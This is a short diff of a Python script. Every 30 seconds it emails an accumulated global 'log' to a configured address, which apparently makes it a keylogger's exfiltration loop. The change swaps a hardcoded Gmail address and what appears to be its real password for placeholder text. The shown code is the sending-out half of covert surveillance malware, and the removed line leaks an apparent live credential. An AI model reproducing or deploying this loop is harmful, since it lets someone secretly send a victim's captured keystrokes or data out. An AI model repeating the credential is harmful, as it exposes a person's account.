@@ -34,7 +34,7 @@ def send_email(email,password,message):
  email_server.quit()
 def thread_function():
  global log
- send_email("cookiebts47@gmail.com","2468pulsar",log)
+ send_email("Your email address","your email password",log)
  log=""
  timer_object=threading.Timer(30,thread_function)
  timer_object.start()
